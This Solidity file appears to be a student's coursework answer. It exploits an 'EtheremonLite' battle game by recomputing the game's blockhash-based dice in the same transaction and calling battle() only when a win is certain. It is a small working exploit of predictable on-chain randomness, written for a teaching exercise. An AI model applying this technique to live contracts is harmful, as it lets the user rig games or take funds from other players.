// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtheremonLite {
    function initMonster(string memory _monsterName) public {}
    function getName(address _monsterAddress) public view returns(string memory) {}
    function getNumWins(address _monsterAddress) public view returns(uint) {}
    function getNumLosses(address _monsterAddress) public view returns(uint) {}
    function battle() public returns(bool){}
}

contract WinBattle {
    
    // Placeholder; TODO for Q2
    function winBattle() public {
        EtheremonLite etheremon = EtheremonLite(0x04EAB7C83B2F45bDbE9DF44E337740bbdFe5efDE);
        etheremon.initMonster("st786");
        uint dice = uint(blockhash(block.number - 1));
        dice = dice / 2; // Divide the dice by 2 to add obfuscation
        // We know the battle ratio will be 3 because the Ogre is initialized to weight of 3
        // and the challenger is initialized to weight of 1 -> 3/1 = 3. 
        // We will only win if the dice is divisible by 3 so that is when we call battle func
        if (dice % 3 == 0){ 
            // we want two or more wins and 0 losses
            etheremon.battle();
            etheremon.battle();
            etheremon.battle();
            etheremon.battle();
        }
    } 
}


